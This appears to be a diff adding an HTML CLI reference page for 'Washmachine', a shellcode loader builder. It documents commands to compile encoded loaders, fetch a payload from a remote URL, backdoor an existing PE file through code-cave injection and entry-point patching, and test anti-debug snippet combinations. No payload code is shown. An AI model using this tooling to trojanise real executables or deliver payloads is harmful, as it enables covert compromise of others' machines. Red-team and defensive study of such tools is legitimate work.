@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CLI Reference // Washmachine</title>
+    <link rel="stylesheet" href="css/cyberpunk.css">
+</head>
+<body>
+    <div class="scanlines"></div>
+    <div class="glitch-overlay"></div>
+
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <div class="logo">
+                <span class="glitch" data-text="WASHMACHINE">WASHMACHINE</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="index.html">HOME</a></li>
+                <li><a href="features.html">FEATURES</a></li>
+                <li><a href="cli.html" class="active">CLI REFERENCE</a></li>
+                <li><a href="yaml.html">YAML CATALOG</a></li>
+                <li><a href="architecture.html">ARCHITECTURE</a></li>
+                <li><a href="building.html">BUILDING</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="page-header">
+        <div class="container">
+            <h1 class="page-title">// CLI REFERENCE</h1>
+            <p class="page-subtitle">Complete command-line interface documentation</p>
+        </div>
+    </div>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// USAGE</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="command">washmachine-cli &lt;command&gt; [options]</span></pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">Available Commands</h3>
+
+            <div class="command-grid">
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">compile</span>
+                        <span class="cmd-badge">PRIMARY</span>
+                    </div>
+                    <p>Build a shellcode loader executable</p>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">analyze</span>
+                        <span class="cmd-badge">UTILITY</span>
+                    </div>
+                    <p>Analyze a PE file (headers, sections, imports, code caves)</p>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">backdoor</span>
+                        <span class="cmd-badge">ADVANCED</span>
+                    </div>
+                    <p>Inject shellcode into an existing PE via code-cave</p>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">list</span>
+                        <span class="cmd-badge">INFO</span>
+                    </div>
+                    <p>List available templates, encoders, snippets, or compilers</p>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">provision</span>
+                        <span class="cmd-badge">SETUP</span>
+                    </div>
+                    <p>Download and install required external tools (Bin2Shell)</p>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-header">
+                        <span class="cmd-name">test</span>
+                        <span class="cmd-badge">TESTING</span>
+                    </div>
+                    <p>Run the automated test harness</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// COMPILE COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="command">washmachine-cli compile -s &lt;shellcode&gt; -t &lt;template&gt; [options]</span>
+
+<span class="comment"># Compile from a .bin shellcode file using the minimal template</span>
+<span class="prompt">></span> washmachine-cli compile -s payload.bin -t shellcode-minimal
+
+<span class="comment"># Compile with XOR encoding, output as JSON</span>
+<span class="prompt">></span> washmachine-cli compile -s payload.bin -e 1 --json
+
+<span class="comment"># Use specific compiler</span>
+<span class="prompt">></span> washmachine-cli compile -s payload.bin -t default --compiler msvc
+
+<span class="comment"># Web delivery mode</span>
+<span class="prompt">></span> washmachine-cli compile --url https://example.com/payload.bin -t default</pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">Options</h3>
+
+            <table class="options-table">
+                <thead>
+                    <tr>
+                        <th>OPTION</th>
+                        <th>DESCRIPTION</th>
+                        <th>REQUIRED</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>-s, --shellcode</code></td>
+                        <td>Path to shellcode file (.bin)</td>
+                        <td>Yes*</td>
+                    </tr>
+                    <tr>
+                        <td><code>-t, --template</code></td>
+                        <td>Template ID from YAML catalog</td>
+                        <td>Yes</td>
+                    </tr>
+                    <tr>
+                        <td><code>--url</code></td>
+                        <td>Remote URL for web delivery mode</td>
+                        <td>No</td>
+                    </tr>
+                    <tr>
+                        <td><code>-e, --encoder</code></td>
+                        <td>Encoder index (0=none, 1=XOR, 2=RC4, etc.)</td>
+                        <td>No</td>
+                    </tr>
+                    <tr>
+                        <td><code>--envelope</code></td>
+                        <td>Envelope index (0=none, 1=Base64, etc.)</td>
+                        <td>No</td>
+                    </tr>
+                    <tr>
+                        <td><code>--compiler</code></td>
+                        <td>Force specific compiler (msvc, gcc, clang)</td>
+                        <td>No</td>
+                    </tr>
+                    <tr>
+                        <td><code>-o, --output</code></td>
+                        <td>Output file path</td>
+                        <td>No</td>
+                    </tr>
+                    <tr>
+                        <td><code>--json</code></td>
+                        <td>Output results as JSON</td>
+                        <td>No</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p class="note">* Either <code>-s</code> or <code>--url</code> must be provided</p>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// ANALYZE COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># Analyze a PE file</span>
+<span class="prompt">></span> washmachine-cli analyze target.exe
+
+<span class="output">[PE Analysis: target.exe]
+DOS Header:     Valid (MZ signature)
+NT Headers:     Valid (PE\0\0 signature)
+Architecture:   x64
+Subsystem:      Windows GUI
+Image Base:     0x140000000
+Entry Point:    0x1400
+
+Sections:
+  .text    VA: 0x1000  Size: 0x4000  Characteristics: CODE|EXECUTE|READ
+  .rdata   VA: 0x5000  Size: 0x2000  Characteristics: INITIALIZED|READ
+  .data    VA: 0x7000  Size: 0x1000  Characteristics: INITIALIZED|READ|WRITE
+
+Code Caves Found: 3
+  Cave 1: .text   Offset: 0x3F00  Size: 256 bytes
+  Cave 2: .rdata  Offset: 0x6E00  Size: 512 bytes</span>
+
+<span class="comment"># Output as JSON for automation</span>
+<span class="prompt">></span> washmachine-cli analyze target.exe --json</pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">Options</h3>
+
+            <table class="options-table">
+                <thead>
+                    <tr>
+                        <th>OPTION</th>
+                        <th>DESCRIPTION</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>&lt;pe-file&gt;</code></td>
+                        <td>Path to PE executable to analyze</td>
+                    </tr>
+                    <tr>
+                        <td><code>--json</code></td>
+                        <td>Output results as JSON</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// BACKDOOR COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># Inject shellcode into an existing PE</span>
+<span class="prompt">></span> washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe
+
+<span class="output">[+] Analyzing target PE...
+[+] Found code cave: .text section, 512 bytes
+[+] Injecting shellcode (342 bytes)...
+[+] Patching entry point...
+[✓] Backdoored PE saved to: patched.exe</span>
+
+<span class="comment"># Specify cave manually</span>
+<span class="prompt">></span> washmachine-cli backdoor --pe target.exe -s payload.bin --cave-offset 0x3F00 -o patched.exe</pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">Options</h3>
+
+            <table class="options-table">
+                <thead>
+                    <tr>
+                        <th>OPTION</th>
+                        <th>DESCRIPTION</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>--pe</code></td>
+                        <td>Target PE file to backdoor</td>
+                    </tr>
+                    <tr>
+                        <td><code>-s, --shellcode</code></td>
+                        <td>Path to shellcode file (.bin)</td>
+                    </tr>
+                    <tr>
+                        <td><code>-o, --output</code></td>
+                        <td>Output patched PE file</td>
+                    </tr>
+                    <tr>
+                        <td><code>--cave-offset</code></td>
+                        <td>Manual code cave offset (optional)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// LIST COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># List discovered compilers</span>
+<span class="prompt">></span> washmachine-cli list --compilers
+
+<span class="output">Available Compilers:
+  [1] MSVC    C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.39\bin\Hostx64\x64\cl.exe
+  [2] GCC     C:\msys64\mingw64\bin\g++.exe
+  [3] Clang   C:\Program Files\LLVM\bin\clang++.exe</span>
+
+<span class="comment"># List available templates</span>
+<span class="prompt">></span> washmachine-cli list --templates
+
+<span class="output">Available Templates:
+  - default           Full loader with all features
+  - shellcode-minimal Bare minimum VirtualAlloc loader</span>
+
+<span class="comment"># List encoders and envelopes</span>
+<span class="prompt">></span> washmachine-cli list --encoders
+<span class="prompt">></span> washmachine-cli list --envelopes
+
+<span class="comment"># List snippet sections</span>
+<span class="prompt">></span> washmachine-cli list --snippets</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// PROVISION COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># Download Bin2Shell (run once before using encoding features)</span>
+<span class="prompt">></span> washmachine-cli provision
+
+<span class="output">[+] Checking for Bin2Shell...
+[!] Bin2Shell not found
+[+] Downloading from GitHub...
+[████████████████████████████████] 100%
+[+] Extracting to Tools/Bin2Shell/
+[✓] Bin2Shell installed successfully
+[✓] Python 3.10+ detected
+[✓] All requirements met</span></pre>
+                </div>
+            </div>
+
+            <p class="note">The provision command downloads and configures external dependencies. Currently handles Bin2Shell for payload encoding.</p>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// TEST COMMAND</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># Run the automated test harness</span>
+<span class="prompt">></span> washmachine-cli test --shellcode messagebox.bin --phase all
+
+<span class="output">[Test Harness] Starting all phases...
+
+Phase 1: Encoder × Envelope Combinations
+  [1/12] XOR + Base64        ✓ Build successful
+  [2/12] XOR + Base32        ✓ Build successful
+  [3/12] RC4 + Base64        ✓ Build successful
+  ...
+  Phase 1 Complete: 12/12 passed
+
+Phase 2: Template × Snippet Permutations
+  [1/24] default + antidebug1 ✓ Build successful
+  [2/24] default + antidebug2 ✓ Build successful
+  ...
+  Phase 2 Complete: 24/24 passed
+
+Phase 3: Multiple Shellcode Inputs
+  [1/5] calc.bin             ✓ Build successful
+  [2/5] messagebox.bin       ✓ Build successful
+  ...
+  Phase 3 Complete: 5/5 passed
+
+Overall: 41/41 tests passed
+Results written to: test_results.json</span>
+
+<span class="comment"># Run only Phase 1 (encoding combinations)</span>
+<span class="prompt">></span> washmachine-cli test --shellcode payload.bin --phase 1
+
+<span class="comment"># Run Phase 3 with test assets directory</span>
+<span class="prompt">></span> washmachine-cli test --phase 3 --test-assets "testing assets\binary\shellcodes"</pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">Test Phases</h3>
+
+            <div class="grid-3">
+                <div class="card">
+                    <h4>Phase 1</h4>
+                    <p>All encoder × envelope × web-helper combinations</p>
+                    <p class="note">Requires: <code>--shellcode</code></p>
+                </div>
+                <div class="card">
+                    <h4>Phase 2</h4>
+                    <p>All template × snippet permutations with default encoding</p>
+                    <p class="note">Requires: <code>--shellcode</code></p>
+                </div>
+                <div class="card">
+                    <h4>Phase 3</h4>
+                    <p>Multiple shellcode inputs from test assets directory</p>
+                    <p class="note">Requires: <code>--test-assets</code></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// GLOBAL OPTIONS</h2>
+
+            <table class="options-table">
+                <thead>
+                    <tr>
+                        <th>OPTION</th>
+                        <th>DESCRIPTION</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>--json</code></td>
+                        <td>Output results as JSON (available for most commands)</td>
+                    </tr>
+                    <tr>
+                        <td><code>-h, --help</code></td>
+                        <td>Display help information for a command</td>
+                    </tr>
+                    <tr>
+                        <td><code>--version</code></td>
+                        <td>Display version information</td>
+                    </tr>
+                    <tr>
+                        <td><code>-v, --verbose</code></td>
+                        <td>Enable verbose logging output</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <h4>WASHMACHINE</h4>
+                    <p>Shellcode loader builder framework</p>
+                    <p class="copyright">© 2026 // Open Source</p>
+                </div>
+                <div class="footer-section">
+                    <h4>DOCUMENTATION</h4>
+                    <ul>
+                        <li><a href="features.html">Features</a></li>
+                        <li><a href="cli.html">CLI Reference</a></li>
+                        <li><a href="yaml.html">YAML Catalog</a></li>
+                        <li><a href="architecture.html">Architecture</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>RESOURCES</h4>
+                    <ul>
+                        <li><a href="building.html">Building</a></li>
+                        <li><a href="#">GitHub Repository</a></li>
+                        <li><a href="#">Report Issues</a></li>
+                        <li><a href="#">License</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/cyberpunk.js"></script>
+</body>
+</html>
